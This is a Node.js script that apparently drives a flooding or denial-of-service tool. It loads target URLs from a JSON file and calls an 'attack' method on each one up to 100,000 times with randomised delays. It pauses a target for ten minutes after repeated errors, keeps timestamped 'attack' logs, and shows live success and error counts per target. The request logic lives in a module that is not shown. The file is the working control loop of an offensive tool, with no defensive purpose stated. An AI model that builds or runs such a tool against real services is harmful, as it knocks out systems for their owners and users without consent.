const { Endpoint } = require("./endpoint");
const { sleep, sleepRand } = require("./helpers");
const pino = require('pino')
const targets = require("./targets.json")

const transport = pino.transport({
  target: './log-transport.mjs',
  options: { destination: `./logs/`, filename: 'attack_' + (new Date()).toJSON() + '.log' }
})
const logger = pino(transport)

const endpoints = targets.map((params) => new Endpoint(params, logger))

const EXECUTION_LIMIT = 100000
const TIMEOUT_BASE = 1000

const run = async () => {
  await sleep(2000)

  for (let i = 0; i < EXECUTION_LIMIT; i++) {
    await sleepRand(TIMEOUT_BASE, TIMEOUT_BASE + 1000)
    endpoints.forEach(endpoint => {
      if (endpoint.stats.errorsInRow > 5)
        endpoint.cooldown(60 * 10) // cooldown for 10 min
      else
        endpoint.attack()
    })
  }

  while (true) {
    await sleep(2000)
    console.clear()
    endpoints.forEach(endpoint => console.log(`${endpoint.url} | Errors: ${endpoint.stats.e} | Success: ${endpoint.stats.s}`))
  }
}

run().catch(e => { throw e })
